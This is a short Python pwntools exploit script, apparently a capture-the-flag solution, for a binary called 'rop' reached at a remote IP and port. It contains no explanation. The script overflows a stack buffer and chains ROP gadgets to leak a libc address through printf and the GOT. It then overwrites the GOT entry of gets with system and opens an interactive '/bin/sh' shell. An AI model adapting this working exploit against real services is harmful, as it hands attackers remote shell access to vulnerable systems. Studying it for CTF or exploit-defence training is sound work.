from pwn import *

#context.log_level= 'debug'
#io = process('./rop')
io = remote('218.76.35.75',4555)

e = ELF('./rop')
#libc = e.libc
libc = ELF('./libc')

pop_rdi = 0x0000000000400763 # pop rdi ; ret
pop_rsi = 0x0000000000400761 # pop rsi ; pop r15 ; ret
_s = 0x00040078E

payload = 'A'*72
payload += p64(pop_rdi) + p64(_s)
payload += p64(pop_rsi) + p64(e.got['gets']) + 'A'*8
payload += p64(e.plt['printf']) # leak gets

payload += p64(pop_rdi) + p64(e.bss(0x10))
payload += p64(e.plt['gets']) # write /bin/sh

payload += p64(pop_rdi) + p64(e.got['gets'])
payload += p64(e.plt['gets']) # printf-> system

payload += p64(pop_rdi) + p64(e.bss(0x10))
payload += p64(e.plt['gets'])

#gdb.attach(io, 'b *0x000400680')
io.sendline(payload)
io.recvuntil('\n')

buf = io.recv()

gets_addr = u64(buf[:6].ljust(8,'\x00'))
libc_base = gets_addr - libc.symbols['gets']
system_addr = libc_base + libc.symbols['system']

io.sendline('/bin/sh')
io.sendline(p64(system_addr))
io.interactive()

